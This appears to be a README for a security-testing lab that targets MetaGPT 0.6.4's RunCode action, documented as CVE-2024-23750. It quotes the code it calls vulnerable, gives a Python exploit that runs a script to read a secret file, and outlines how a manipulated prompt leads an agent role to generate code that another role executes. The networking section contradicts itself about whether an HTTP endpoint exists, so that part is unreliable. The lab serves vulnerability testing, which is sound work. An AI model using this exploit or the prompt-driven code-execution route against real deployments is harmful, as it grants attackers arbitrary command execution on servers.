# MetaGPT 0.6.4 - Agent Source Code Location

## Overview

This directory provides the attacker container configuration for MetaGPT 0.6.4 security testing.

## Agent Source Code Location (in Target Container)

**Container Path:** `/app/metagpt-source`
**Version:** v0.6.4
**Repository:** https://github.com/geekan/MetaGPT
**Git Tag:** `v0.6.4`

## Directory Structure

```
/app/metagpt-source/
├── metagpt/                 # Main source code
│   ├── actions/             # Action implementations
│   │   ├── run_code.py     # RunCode action (CVE-2024-23750)
│   │   ├── action.py       # Base action class
│   │   └── ...
│   ├── roles/               # Role implementations
│   │   ├── engineer.py     # Engineer role
│   │   ├── qa_engineer.py  # QA Engineer role (uses RunCode)
│   │   └── ...
│   ├── provider/            # LLM provider interfaces
│   ├── utils/               # Utility functions
│   └── config.py           # Configuration
├── examples/               # Example scripts
├── tests/                  # Test suite
└── setup.py               # Package setup
```

## Key Components

### RunCode Action
- **File:** `metagpt/actions/run_code.py`
- **Class:** `RunCode`
- **Method:** `run_script(working_directory, additional_python_paths, command)`
- **Purpose:** Execute Python code/scripts for testing
- **Used By:** QaEngineer role

### Vulnerable Code (CVE-2024-23750)

Located in `metagpt/actions/run_code.py`:

```python
@classmethod
async def run_script(cls, working_directory, additional_python_paths=[], command=[]) -> Tuple[str, str]:
    working_directory = str(working_directory)
    additional_python_paths = [str(path) for path in additional_python_paths]

    # Copy the current environment variables
    env = CONFIG.new_environ()

    # Modify the PYTHONPATH environment variable
    additional_python_paths = [working_directory] + additional_python_paths
    additional_python_paths = ":".join(additional_python_paths)
    env["PYTHONPATH"] = additional_python_paths + ":" + env.get("PYTHONPATH", "")
    RunCode._install_dependencies(working_directory=working_directory, env=env)

    # VULNERABLE: Directly executes user-controlled commands
    process = subprocess.Popen(
        command,  # User input not sufficiently validated
        cwd=working_directory,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        env=env
    )
    logger.info(" ".join(command))

    try:
        # Wait for the process to complete, with a timeout
        stdout, stderr = process.communicate(timeout=10)
    except subprocess.TimeoutExpired:
        logger.info("The command did not complete within the given timeout.")
        process.kill()
        stdout, stderr = process.communicate()
    return stdout.decode("utf-8"), stderr.decode("utf-8")
```

## Exploitation Method

### Direct Module Import (For Testing)

Since MetaGPT doesn't expose RunCode via HTTP API, exploitation requires direct access to the MetaGPT module:

```python
import sys
sys.path.insert(0, '/app/metagpt-source')

from metagpt.actions.run_code import RunCode
import asyncio

# Create malicious script
malicious_script = "/tmp/malicious.py"
with open(malicious_script, 'w') as f:
    f.write("import os; os.system('cat /tmp/secret.txt')")

# Execute via RunCode
async def exploit():
    stdout, stderr = await RunCode.run_script(
        working_directory="/tmp",
        command=["python3", malicious_script]
    )
    return stdout

result = asyncio.run(exploit())
```

## Attack Vector

In real-world scenarios, this vulnerability would be triggered by:
1. Attacker manipulates prompts to control code generation
2. Engineer role generates code containing malicious instructions
3. QaEngineer role uses RunCode to execute the code
4. Arbitrary commands execute on server with application privileges

## Network Access

- **Target Hostname:** `metagpt`
- **HTTP Server:** `http://metagpt:8080`
- **API Endpoint:** `POST /api/run_code`

API Request Format:
```json
{
  "working_directory": "/tmp",
  "command": ["python3", "-c", "malicious_code"],
  "additional_python_paths": []
}
```
From attacker container:
- **Target Hostname:** `metagpt`
- **No HTTP server by default**

## Configuration Requirements

MetaGPT requires LLM configuration to fully initialize. For security testing of the RunCode vulnerability specifically, the `run_script` method can be called directly without full MetaGPT initialization.

## Known Vulnerabilities

### CVE-2024-23750: Arbitrary Code Execution in RunCode
- **File:** `metagpt/actions/run_code.py`
- **Method:** `run_script()`
- **Issue:** subprocess.Popen executes user-controlled command list without proper validation
- **Impact:** Remote Code Execution, arbitrary command execution
- **Severity:** CRITICAL
- **Attack Vector:** Malicious code executed via QaEngineer role
